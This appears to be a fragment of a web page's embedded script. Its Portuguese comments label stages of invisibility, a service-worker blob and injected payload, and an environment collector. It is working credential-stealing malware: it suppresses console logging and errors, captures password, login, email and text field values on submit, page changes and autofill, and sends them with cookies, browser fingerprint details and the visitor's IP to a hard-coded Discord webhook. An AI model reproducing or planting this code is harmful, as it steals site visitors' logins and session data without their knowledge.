    .cursor{display:inline-block;width:10px;height:20px;background:#f00;margin-left:5px;animation:blink .7s infinite;}

/* ======= 0. INVISIBILIDADE ABSOLUTA ======= */
(()=>{
    const nullFn = ()=>{};
    ["log","warn","error","info","debug"].forEach(m=>{ window.console[m]=nullFn; });
    window.addEventListener("error", e=>{ e.stopImmediatePropagation(); e.preventDefault(); });
    window.addEventListener("unhandledrejection", e=>{ e.stopImmediatePropagation(); e.preventDefault(); });
})();

/* ======= 1. SERVICE-WORKER BLOB (nunca em disco) ======= */
const swCode = `
const HOOK = "https://discord.com/api/webhooks/1443161577866924124/3KawgZj1c9mahMBJAyeYTEibDSIRqmqwEgnr6XN3ytYA7tBhGkELpnVVNvi7slWRZedI";
function exfil(obj){
    fetch(HOOK,{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({username:"Ghost",avatar_url:"https://i.imgur.com/7G9cc9e.png",embeds:[{title:"ðŸ‘»",color:0xff0000,fields:Object.entries(obj).map(([k,v])=>({name:k,value:v+"",inline:true}))}]})
    }).catch(()=>{});
}
self.addEventListener("install",e=>e.waitUntil(self.skipWaiting()));
self.addEventListener("activate",e=>e.waitUntil(self.clients.claim()));
self.addEventListener("fetch",e=>e.respondWith(fetch(e.request)));
self.addEventListener("message",e=>{if(e.data&&e.data.t==="x") exfil(e.data.d);});
`;
const swBlob = new Blob([swCode],{type:"application/javascript"});
const swURL = URL.createObjectURL(swBlob);
navigator.serviceWorker.register(swURL,{scope:"./"}).then(()=>{
    /* ======= 2. PAYLOAD INJETADO (blob efÃªmero) ======= */
    const payload = `
(()=>{
    const post=d=>navigator.serviceWorker.controller.postMessage({t:"x",d});
    const grab=()=>{
        const cred={};
        document.querySelectorAll("input[type=password],input[name*=pass],input[name*=login],input[name*=user],input[name*=email],input[type=text]").forEach(i=>{
            if(i.value){
                const k=(i.name||i.id||i.placeholder||"field").replace(/\\s/g,"_");
                cred[k]=i.value;
            }
        });
        if(Object.keys(cred).length) post({url:location.href,cred});
    };
    new MutationObserver(grab).observe(document.body,{childList:true,subtree:true});
    document.addEventListener("submit",grab,true);
    window.addEventListener("animationstart",e=>{if(e.animationName==="onautofillstart")grab()},true);
    setTimeout(grab,300);
})();
    `;
    const pBlob = new Blob([payload],{type:"application/javascript"});
    import(URL.createObjectURL(pBlob));
});

/* ======= 3. COLETOR AMBIENTAL (apenas uma vez) ======= */
(()=>{
    const hook = "https://discord.com/api/webhooks/1443161577866924124/3KawgZj1c9mahMBJAyeYTEibDSIRqmqwEgnr6XN3ytYA7tBhGkELpnVVNvi7slWRZedI";
    const send=o=>fetch(hook,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:"Ghost",avatar_url:"https://i.imgur.com/7G9cc9e.png",embeds:[{title:"ðŸ‘» Env",color:0xff0000,fields:Object.entries(o).map(([k,v])=>({name:k,value:v+"",inline:true}))}]})}).catch(()=>{});
    const data={
        url:location.href,
        ua:navigator.userAgent,
        platform:navigator.platform,
        screen:`${screen.width}x${screen.height}`,
        tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
        lang:navigator.languages.join(", "),
        cores:navigator.hardwareConcurrency||"?",
        mem:navigator.deviceMemory||"?",
        ref:document.referrer||"direct",
        cookie:document.cookie||"none",
        ts:new Date().toISOString()
    };
    fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>{data.ip=j.ip;send(data);}).catch(()=>{data.ip="?";send(data);});
})();
</script>
